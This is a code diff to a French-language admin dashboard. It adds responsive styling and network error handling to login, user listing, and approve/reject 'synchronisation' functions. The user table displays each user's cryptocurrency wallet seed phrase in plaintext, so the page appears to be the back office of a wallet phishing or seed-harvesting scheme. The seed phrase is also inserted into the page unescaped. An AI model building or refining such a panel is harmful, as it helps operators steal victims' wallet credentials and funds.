@@ -106,9 +106,20 @@
             word-break: break-all;
             color: #8b8cae;
         }
+        .action-buttons {
+            display: flex;
+            gap: 5px;
+            flex-wrap: wrap;
+        }
         @media (max-width: 768px) {
             .stats { grid-template-columns: repeat(2, 1fr); }
             th, td { font-size: 12px; }
+            .seed-words { max-width: 100px; }
+        }
+        @media (max-width: 480px) {
+            .stats { grid-template-columns: 1fr; }
+            .action-buttons { flex-direction: column; }
+            .btn { width: 100%; }
         }
     </style>
 </head>
@@ -171,40 +182,51 @@
                 } else {
                     localStorage.removeItem('adminToken');
                 }
-            } catch(e) {}
+            } catch(e) {
+                console.error('Erreur session admin:', e);
+            }
         }
         
         async function adminLogin() {
             const email = document.getElementById('adminEmail').value;
             const password = document.getElementById('adminPassword').value;
-            const res = await fetch(`/api/admin/login`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, password })
-            });
-            const data = await res.json();
-            if (data.success) {
-                localStorage.setItem('adminToken', data.token);
-                adminToken = data.token;
-                document.getElementById('loginPanel').style.display = 'none';
-                document.getElementById('adminContent').style.display = 'block';
-                loadUsers();
-            } else {
-                alert('Identifiants incorrects');
+            
+            try {
+                const res = await fetch(`/api/admin/login`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    localStorage.setItem('adminToken', data.token);
+                    adminToken = data.token;
+                    document.getElementById('loginPanel').style.display = 'none';
+                    document.getElementById('adminContent').style.display = 'block';
+                    loadUsers();
+                } else {
+                    alert('Identifiants incorrects');
+                }
+            } catch(e) {
+                alert('Erreur réseau');
             }
         }
         
         async function loadUsers() {
-            const res = await fetch(`/api/admin/users`, {
-                headers: { 'Authorization': `Bearer ${adminToken}` }
-            });
-            const data = await res.json();
-            if (data.success) {
-                const users = data.users;
-                document.getElementById('totalUsers').innerText = users.length;
-                document.getElementById('pendingUsers').innerText = users.filter(u => u.status === 'pending').length;
-                document.getElementById('approvedUsers').innerText = users.filter(u => u.status === 'approved').length;
-                renderUsersTable(users);
+            try {
+                const res = await fetch(`/api/admin/users`, {
+                    headers: { 'Authorization': `Bearer ${adminToken}` }
+                });
+                const data = await res.json();
+                if (data.success) {
+                    const users = data.users;
+                    document.getElementById('totalUsers').innerText = users.length;
+                    document.getElementById('pendingUsers').innerText = users.filter(u => u.status === 'pending').length;
+                    document.getElementById('approvedUsers').innerText = users.filter(u => u.status === 'approved').length;
+                    renderUsersTable(users);
+                }
+            } catch(e) {
+                console.error('Erreur chargement users:', e);
             }
         }
         
@@ -225,12 +247,14 @@
                     <td class="seed-words">${user.seed_phrase || 'Non renseigné'}</td>
                     <td>${new Date(user.created_at).toLocaleDateString()}</td>
                     <td>
-                        ${user.status === 'pending' ? `
-                            <button class="btn btn-approve" onclick="approveUser(${user.id})"><i class="fas fa-check"></i> Approuver</button>
-                            <button class="btn btn-reject" onclick="rejectUser(${user.id})"><i class="fas fa-times"></i> Rejeter</button>
-                        ` : `
-                            <span style="color:#8b8cae; font-size:12px;">${user.status === 'approved' ? '✅ Traité' : '❌ Rejeté'}</span>
-                        `}
+                        <div class="action-buttons">
+                            ${user.status === 'pending' ? `
+                                <button class="btn btn-approve" onclick="approveUser(${user.id})"><i class="fas fa-check"></i> Approuver</button>
+                                <button class="btn btn-reject" onclick="rejectUser(${user.id})"><i class="fas fa-times"></i> Rejeter</button>
+                            ` : `
+                                <span style="color:#8b8cae; font-size:12px;">${user.status === 'approved' ? '✅ Traité' : '❌ Rejeté'}</span>
+                            `}
+                        </div>
                     </td>
                 </tr>
             `).join('');
@@ -238,33 +262,41 @@
         
         async function approveUser(userId) {
             if (!confirm('Approuver cette synchronisation ?')) return;
-            const res = await fetch(`/api/admin/approve-user`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` },
-                body: JSON.stringify({ userId })
-            });
-            const data = await res.json();
-            if (data.success) {
-                alert('✅ Synchronisation approuvée !');
-                loadUsers();
-            } else {
-                alert('Erreur');
+            try {
+                const res = await fetch(`/api/admin/approve-user`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` },
+                    body: JSON.stringify({ userId })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    alert('✅ Synchronisation approuvée !');
+                    loadUsers();
+                } else {
+                    alert('Erreur');
+                }
+            } catch(e) {
+                alert('Erreur réseau');
             }
         }
         
         async function rejectUser(userId) {
             if (!confirm('Rejeter cette synchronisation ?')) return;
-            const res = await fetch(`/api/admin/reject-user`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` },
-                body: JSON.stringify({ userId })
-            });
-            const data = await res.json();
-            if (data.success) {
-                alert('❌ Synchronisation rejetée');
-                loadUsers();
-            } else {
-                alert('Erreur');
+            try {
+                const res = await fetch(`/api/admin/reject-user`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${adminToken}` },
+                    body: JSON.stringify({ userId })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    alert('❌ Synchronisation rejetée');
+                    loadUsers();
+                } else {
+                    alert('Erreur');
+                }
+            } catch(e) {
+                alert('Erreur réseau');
             }
         }
         
